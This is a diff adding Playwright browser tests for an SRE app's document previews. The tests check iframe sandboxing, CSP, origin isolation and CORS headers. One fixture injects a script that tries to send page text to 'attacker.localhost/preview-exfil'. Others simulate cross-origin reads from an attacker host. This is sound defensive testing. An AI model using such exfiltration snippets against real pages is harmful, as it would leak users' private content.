+  await expect(externalFrame.getByRole('heading', { name: 'External guide' })).toBeVisible()
+  await expect(page).toHaveURL(`/sre/_previews/${previewHeadSha}/guides/preview.html?group=pr%3A42`)
+
+  await page.goto(`/sre/_previews/${previewHeadSha}/guides/preview.html?group=pr%3A42`)
+  const changedFrame = page.frameLocator('iframe[title="Local preview HTML"]')
+  await changedFrame.getByRole('link', { name: 'Open the changed Markdown document', exact: true }).click()
+  await expect(page).toHaveURL(new RegExp(`/sre/_previews/${previewHeadSha}/guides/preview-guide\\.md\\?group=pr%3A42$`))
+  await expect(page.getByRole('link', { name: 'Return to PR #42 ↗' })).toBeVisible()
+
+  await page.goto(`/sre/_previews/${previewHeadSha}/guides/preview.html?group=pr%3A42`)
+  await page.frameLocator('iframe[title="Local preview HTML"]').getByRole('link', { name: 'Open the published retrospective' }).click()
+  await expect(page).toHaveURL('/sre/reports/latency-retrospective.md')
+  await expect(page.getByRole('heading', { name: 'Preview' })).toHaveCount(0)
+  await expect(page.getByRole('button', { name: 'Go to SRE home' })).toBeVisible()
+})
+
+test('a non-loopback app origin keeps the sandboxed srcDoc preview reader bridge', async ({ page }) => {
+  await page.goto('/sre')
+  const appOrigin = new URL(page.url())
+  appOrigin.hostname = 'preview-app.localhost'
+  await page.goto(`${appOrigin.origin}/sre/_previews/${previewHeadSha}/guides/preview.html?group=pr%3A42`)
+
+  const iframe = page.locator('iframe[title="Local preview HTML"]')
+  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts')
+  const srcDoc = await iframe.getAttribute('srcdoc')
+  expect(srcDoc).toContain('Content-Security-Policy')
+  expect(srcDoc).toContain("connect-src 'none'")
+  expect(srcDoc).toContain('<base href=')
+  expect(srcDoc).toContain('/preview-bridge.js')
+
+  const frame = page.frameLocator('iframe[title="Local preview HTML"]')
+  await expect(frame.getByRole('heading', { name: 'Local preview HTML' })).toBeVisible()
+  await expect(frame.getByRole('img', { name: 'Blue preview mark' })).toBeVisible()
+  await expect.poll(() => frame.locator('html').getAttribute('data-preview-fixture')).toBe('loaded')
+  const parentAccess = await frame.locator('body').evaluate(() => {
+    try {
+      void window.parent.document
+      return 'accessible'
+    } catch {
+      return 'blocked'
+    }
+  })
+  expect(parentAccess).toBe('blocked')
+
+  await frame.getByRole('link', { name: 'Open the changed Markdown document' }).click()
+  await expect(page).toHaveURL(`${appOrigin.origin}/sre/_previews/${previewHeadSha}/guides/preview-guide.md?group=pr%3A42`)
+})
+
+test('non-loopback srcDoc enforces CSP before malformed preview HTML can load external resources', async ({ page }) => {
+  await page.goto('/sre')
+  const appOrigin = new URL(page.url())
+  appOrigin.hostname = 'preview-app.localhost'
+
+  await page.route(`**/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`, (route) => route.fulfill({
+    status: 200,
+    contentType: 'text/html; charset=utf-8',
+    body: `<main>private-preview-canary</main><script>
+      document.addEventListener('securitypolicyviolation', (event) => {
+        const marker = document.createElement('p')
+        marker.id = 'preview-csp-blocked-request'
+        marker.textContent = event.blockedURI
+        document.body.append(marker)
+      })
+      const image = new Image()
+      image.src = 'http://attacker.localhost/preview-exfil?value=' + encodeURIComponent(document.body.textContent)
+    </script><head><meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' data: blob:"></head>`,
+  }))
+  await page.goto(`${appOrigin.origin}/sre/_previews/${previewHeadSha}/guides/preview.html?group=pr%3A42`)
+
+  const iframe = page.locator('iframe[title="Local preview HTML"]')
+  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts')
+  const frame = page.frameLocator('iframe[title="Local preview HTML"]')
+  await expect(frame.locator('body')).toContainText('private-preview-canary')
+  await expect(frame.locator('#preview-csp-blocked-request')).toContainText('attacker.localhost')
+})
+
+test('a third-party opaque-origin sandbox cannot read local preview objects', async ({ page }) => {
+  await page.goto('/sre')
+  const appUrl = new URL(page.url())
+  appUrl.hostname = 'attacker.localhost'
+  await page.goto(appUrl.origin)
+  const previewUrl = new URL(`/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`, page.url())
+  previewUrl.hostname = '127.0.0.1'
+
+  const result = await page.evaluate((targetUrl) => new Promise<{ origin: string; readable: boolean }>((resolve) => {
+    const frame = document.createElement('iframe')
+    frame.setAttribute('sandbox', 'allow-scripts')
+    const timer = window.setTimeout(() => resolve({ origin: 'unknown', readable: true }), 5000)
+    const onMessage = (event: MessageEvent<{ type?: unknown; origin?: unknown; readable?: unknown }>) => {
+      if (event.source !== frame.contentWindow || event.data?.type !== 'opaque-preview-result') return
+      window.clearTimeout(timer)
+      window.removeEventListener('message', onMessage)
+      resolve({ origin: String(event.data.origin), readable: event.data.readable === true })
+    }
+    window.addEventListener('message', onMessage)
+    frame.srcdoc = `<script>const frameOrigin = location.origin; fetch(${JSON.stringify(targetUrl)}).then(async (response) => { const body = await response.text(); parent.postMessage({ type: 'opaque-preview-result', origin: frameOrigin, readable: response.ok && body.includes('Local preview HTML') }, '*'); }).catch(() => parent.postMessage({ type: 'opaque-preview-result', origin: frameOrigin, readable: false }, '*'))</script>`
+    document.body.append(frame)
+  }), previewUrl)
+
+  expect(result.origin).toBe('null')
+  expect(result.readable).toBe(false)
+})
+
+test('isolated preview CSP allows loopback app frames and blocks third-party embedding', async ({ page }) => {
+  await page.goto('/sre')
+  const previewUrl = new URL(`/_previews/sre/revisions/${previewHeadSha}/files/guides/preview.html`, page.url())
+  previewUrl.hostname = 'preview.localhost'
+  const attackerUrl = new URL(page.url())
+  attackerUrl.hostname = 'attacker.localhost'
+  await page.goto(attackerUrl.origin)
+
+  const frameAncestorsViolation = page.waitForEvent('console', (message) => (
+    message.type() === 'error' && message.text().includes('frame-ancestors')
+  ))
+  await page.evaluate((url) => {
+    const frame = document.createElement('iframe')
+    frame.src = url
+    document.body.append(frame)
+  }, previewUrl.href)
+  await frameAncestorsViolation
+})
+
+test('a direct preview document resolves without catalog membership and suppresses stale PR context', async ({ page }) => {
+  const catalogRequests: string[] = []
+  page.on('request', (request) => {
+    const pathname = new URL(request.url()).pathname
+    if (pathname.endsWith('/_previews/sre/catalog.json')) catalogRequests.push(pathname)
+  })
+  await page.route('**/_previews/sre/catalog.json', (route) => route.fulfill({ status: 404, body: 'catalog unavailable' }))
+
+  await page.goto(`/sre/_previews/${previewHeadSha}/guides/preview-guide.md`)
+  await expect(page.locator('.preview-reader-header h1')).toHaveText('Local preview guide')
+  await expect(page.getByRole('link', { name: /Return to PR/ })).toHaveCount(0)
+  expect(catalogRequests).toEqual([])
+  await page.reload()
+  await expect(page.locator('.preview-reader-header h1')).toHaveText('Local preview guide')
+  expect(catalogRequests).toEqual([])
+
+  const missingManifest = await page.request.get('/_previews/sre/revisions/ffffffffffffffffffffffffffffffffffffffff/manifest.json')
+  expect(missingManifest.status()).toBe(404)
+  await page.goto('/sre/_previews/ffffffffffffffffffffffffffffffffffffffff/guides/missing.md')
+  await expect(page.getByRole('heading', { name: 'Preview unavailable' })).toBeVisible()
+  await page.getByRole('link', { name: '← Back to previews' }).click()
+  await expect(page).toHaveURL('/sre/_previews')
+})
+
+test('a preview-manifest read error stays visible as unknown availability', async ({ page }) => {
+  await page.route(`**/_previews/sre/revisions/${previewHeadSha}/manifest.json`, (route) => (
+    route.fulfill({ status: 503, body: 'temporarily unavailable' })
+  ))
+  await page.goto('/sre/_previews')
+  await expect(page.getByRole('region', { name: 'Preview pr:42' })).toBeVisible()
+  await expect(page.getByText('Availability could not be checked. Direct document links may still work.')).toHaveCount(3)
+  await expect(page.getByRole('region', { name: 'Preview pr:99' })).toHaveCount(0)
+})
+
+test('raw preview resources have real 404s, media types, no-store and no CORS access', async ({ page }) => {
+  const base = `/_previews/sre/revisions/${previewHeadSha}/files`
+  const [catalog, manifest, missingRoot, missingSlash, missing, css, script, svg, font, markdown, html, sandboxOrigin, externalOrigin] = await Promise.all([
+    page.request.get('/_previews/sre/catalog.json'),
+    page.request.get(`/_previews/sre/revisions/${previewHeadSha}/manifest.json`),
+    page.request.get('/_previews'),
+    page.request.get('/_previews/'),
+    page.request.get(`${base}/missing.css`),
+    page.request.get(`${base}/assets/preview.css`),
+    page.request.get(`${base}/assets/preview.js`),
+    page.request.get(`${base}/assets/mark.svg`),
+    page.request.get(`${base}/fonts/preview.woff2`),
+    page.request.get(`${base}/guides/preview-guide.md`),
+    page.request.get(`${base}/guides/preview.html`),
+    page.request.get(`${base}/fonts/preview.woff2`, { headers: { origin: 'null' } }),
+    page.request.get(`${base}/fonts/preview.woff2`, { headers: { origin: 'https://attacker.example' } }),
+  ])
+
+  expect(catalog.status()).toBe(200)
+  expect(catalog.headers()['content-type']).toContain('application/json')
+  expect(manifest.status()).toBe(200)
+  expect(manifest.headers()['content-type']).toContain('application/json')
+  expect(missingRoot.status()).toBe(404)
+  expect(missingSlash.status()).toBe(404)
+  expect((await missingRoot.text()).toLowerCase()).not.toContain('<div id="root">')
+  expect((await missingSlash.text()).toLowerCase()).not.toContain('<div id="root">')
+  expect(missing.status()).toBe(404)
+  expect((await missing.text()).toLowerCase()).not.toContain('<div id="root">')
+  expect(css.headers()['content-type']).toContain('text/css')
+  expect(script.headers()['content-type']).toContain('javascript')
+  expect(svg.headers()['content-type']).toContain('image/svg+xml')
+  expect(font.headers()['content-type']).toContain('font/woff2')
+  expect(markdown.headers()['content-type']).toContain('text/markdown')
+  expect(html.headers()['cache-control']).toContain('no-store')
+  for (const response of [catalog, manifest, css, script, svg, font, markdown, html]) {
+    expect(response.headers()['cache-control']).toContain('no-store')
+  }
+  expect(html.headers()['content-security-policy']).toContain("script-src 'none'")
+  expect(html.headers()['x-content-type-options']).toBe('nosniff')
+  expect(sandboxOrigin.headers()['access-control-allow-origin']).toBeUndefined()
+  expect(sandboxOrigin.headers()['vary']).toBeUndefined()
+  expect(externalOrigin.headers()['access-control-allow-origin']).toBeUndefined()
+  expect(externalOrigin.headers()['vary']).toBeUndefined()
 })
